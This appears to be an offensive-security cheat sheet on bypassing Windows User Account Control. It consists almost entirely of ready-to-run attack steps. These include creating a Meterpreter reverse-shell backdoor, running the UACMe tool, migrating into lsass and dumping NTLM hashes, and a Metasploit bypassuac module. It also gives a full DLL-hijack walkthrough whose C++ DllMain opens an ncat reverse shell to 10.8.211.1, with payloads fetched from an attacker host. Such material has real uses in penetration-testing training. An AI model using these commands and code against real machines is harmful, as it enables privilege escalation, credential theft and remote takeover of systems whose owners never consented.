# UAC Bypass

**UAC (User Account Control)** is a Windows security features that is used to prevent unauthorized changes from being made to the OS



## UACIMe

**UACMe** is an open source, robust privilage escalation tool. It can be used to bypass windows UAC by leveraging varius techniques



<details>

<summary>Backdor w/ Metasploit Scenario</summary>

```bash
# Create a backdoor with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > backdoor.exe
```

```bash
# Set up msf listener
service postgresql start && msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $IP
set LPORT $PORT 
run
```

{% code overflow="wrap" %}
```bash
# Create 'Temp' dir on target machine (best folder for payloads)
cd C:\\
mkdir Temp

# Upload the payload on the Temp dir (meterpreter session)
upload backdoor.exe

# Upload the UACMe tool on the target
# https://github.com/hfiref0x/UACME
upload PATH/TO/UACME/Akagi64.exe

# Open Shell
shell

# Use the tool
.\Akagi64.exe KEY C:\Temp\backdoor.exe
## The key is a flag to decide what type of operation the tool do to bypass UAC (23 is the most used)
```
{% endcode %}

```bash
# shell's been open in msf listener (multi/handler)

# check privilege
getprivs

# Migrate windows privilages 
ps -s lsass.exe 
migrate PID

# Make a NTML hashdump 
hashdump
```

</details>





## Metasploit UAC Bypass

{% code title="Metasploit PrivEsc" %}
```bash
service postgresql start && msfconsole
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION SESSION
set LPORT PORT
set TARGET Windows\ x64 
run
```
{% endcode %}



## UAC Bypass - Windows Defender avasion&#x20;

**Summary:** It's possible to trick Windows by creating a folder named `c:\windows\System32\`. You can place a Windows binary (with auto-elevated privileges) there and perform DLL hijacking. For a comprehensive list of binaries vulnerable to this, refer to the provided resource.

### Transfer Netcat to target system

<pre class="language-bash"><code class="lang-bash"><strong># attack machine
</strong><strong>cp /usr/share/windows-binaries/nc.exe .
</strong>python -m SimpleHTTPServer 80

# target machine 
curl http://ATT_IP/ncat.exe -o C:\Temp\ncat.exe
</code></pre>

### Create DLL to hijack

Create a DLL that establish a RevShell when it will loads by a application.

{% code title="example.cpp" %}
```cpp
#include <windows.h>


void exec_custom()
{
	WinExec("c:\\users\\hugo\\Desktop\\ncat.exe -e cmd.exe 10.8.211.1 49732", 1);
}

bool APIENTRY DllMain( HMODULE hModule,
			DWORD ul_reason_for_call,
			LPVOID lpReserved
		)
{
	switch(ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		exec_custom();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return true;
}
```
{% endcode %}

Then, compile the program to create the `.dll` file.

```bash
x86_64-w64-mingw32-gcc -shared -o Secur32.dll example.cpp
```

### Create a "Trusted" folder&#x20;

Create the follow directory as "Trusted" folder:

```powershell
mkdir "C:\Windows \"
mkdir "C:\Windows \System32\"
```

We place the elevated executable `computerdefaults.exe` in that directory, which uses `Secur32.dll`. Next, we download our custom `Secur32.dll` and place it in `C:\Windows \System32\`.

<pre class="language-powershell"><code class="lang-powershell">copy "C:\Windows\System32\computerdefaults.exe" "C:\Windows \System32\computerdefaults.exe"

curl http://ATT_IP/Secur32.dll -o "C:\Windows \System32\Secur32.dll"
<strong>
</strong><strong>"C:\Windows \System32\computerdefaults.exe"
</strong></code></pre>

After executing `"C:\Windows \System32\computerdefaults.exe"` our reverse shell connects, and we obtain a administrator shell.





## Resources

{% embed url="https://notes.morph3.blog/windows/uac-bypass" %}

